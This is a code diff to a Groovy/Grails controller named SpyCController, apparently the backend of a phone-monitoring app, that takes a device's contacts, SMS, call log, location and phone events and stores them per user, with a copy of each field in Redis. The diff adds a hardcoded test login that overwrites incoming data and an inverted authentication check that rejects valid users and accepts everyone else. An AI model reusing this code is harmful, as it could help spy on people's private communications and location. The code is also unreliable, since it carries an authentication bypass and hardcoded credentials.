@@ -10,9 +10,9 @@ import org.codehaus.jackson.type.TypeReference
 import redis.clients.jedis.Jedis
 
 import com.org.krams.domain.Contact
-import com.org.krams.domain.Location;
-import com.org.krams.domain.PhoneParams;
-import com.org.krams.domain.Sms;
+import com.org.krams.domain.Location
+import com.org.krams.domain.PhoneParams
+import com.org.krams.domain.Sms
 import com.org.krams.domain.UMetaData
 import com.xaviar.market.rest.item.DataHolder
 
@@ -25,74 +25,79 @@ class SpyCController {
 	def userService
 
 	def createdata(DataHolder dataHolder) {
-		
-		dataHolder.data = '{"userId":"129","simSubscriberId":"3453453444"}';
-		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
-		String clientLocation = dataHolder.get(DataHolder.LOCATION);
-		String clientSms = dataHolder.get(DataHolder.SMS);
-		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
-		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
-		String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
-		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
+
+		dataHolder.data = '{"userName":"username123","password":"password123","simSubscriberId":"simSubscriberId123","token":""}';
 
 		if (dataHolder.data != null) {
 			ObjectMapper mapper = new ObjectMapper();
 			UMetaData uMetaData = mapper.readValue(dataHolder.data,UMetaData.class);
-			userService.addUserInfo(uMetaData);
-			
-			//		Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
-			//		while (iterator.hasNext()) {
-			//			Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
-			//					.next();
-			//			Jedis jedis = new Jedis("localhost");
-			//			jedis.set(mapEntry.getKey().toString(), mapEntry.getValue()
-			//					.toString());
-			//		}
 
+			//auth user
+			if(userService.authenticateUser(uMetaData)){
+				[validation:"not a valid user"]
+			}else{
+				String clientContacts = dataHolder.get(DataHolder.CONTACTS);
+				String clientLocation = dataHolder.get(DataHolder.LOCATION);
+				String clientSms = dataHolder.get(DataHolder.SMS);
+				String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
+				String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
+				String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
+				String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
 
-			try {
-				if (clientContacts != null) {
-					mapper = new ObjectMapper();
-					List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
-							});
-					contactService.createAll(contacts,uMetaData);
+				//save generic
+				saveForGenericPage(dataHolder)
+
+				try {
+					if (clientContacts != null) {
+						mapper = new ObjectMapper();
+						List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
+								});
+						contactService.createAll(contacts,uMetaData);
+					}
+
+					if (clientLocation != null) {
+						mapper = new ObjectMapper();
+						List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
+								});
+						locationService.createAll(locations,uMetaData);
+					}
+
+					if (clientSms != null) {
+						mapper = new ObjectMapper();
+						List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
+								});
+						smsService.createAll(smses,uMetaData);
+					}
+
+					if (clientPhoneParams != null) {
+						mapper = new ObjectMapper();
+						List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
+								});
+
+					}
+
+					final int id = 12;
+					dataHolder.setID(id);
+					[dataHolder:dataHolder]
+				} catch (JsonParseException e) {
+					e.printStackTrace();
+				} catch (JsonMappingException e) {
+					e.printStackTrace();
+				} catch (IOException e) {
+					e.printStackTrace();
 				}
-
-				if (clientLocation != null) {
-					mapper = new ObjectMapper();
-					List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
-							});
-					locationService.createAll(locations,uMetaData);
-				}
-
-				if (clientSms != null) {
-					mapper = new ObjectMapper();
-					List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
-							});
-					smsService.createAll(smses,uMetaData);
-				}
-				
-				if (clientPhoneParams != null) {
-					mapper = new ObjectMapper();
-					List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
-							});
-
-				}
-
-				final int id = 12;
-				dataHolder.setID(id);
-
-				[dataHolder:dataHolder]
-			} catch (JsonParseException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			} catch (JsonMappingException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
 			}
+		}
+	}
+
+	private saveForGenericPage(DataHolder dataHolder) {
+		Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
+		while (iterator.hasNext()) {
+			Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
+					.next();
+			Jedis jedis = new Jedis("localhost");
+			jedis.set("GENERIC_"+mapEntry.getKey().toString(), mapEntry.getValue()
+					.toString());
 		}
 	}
 
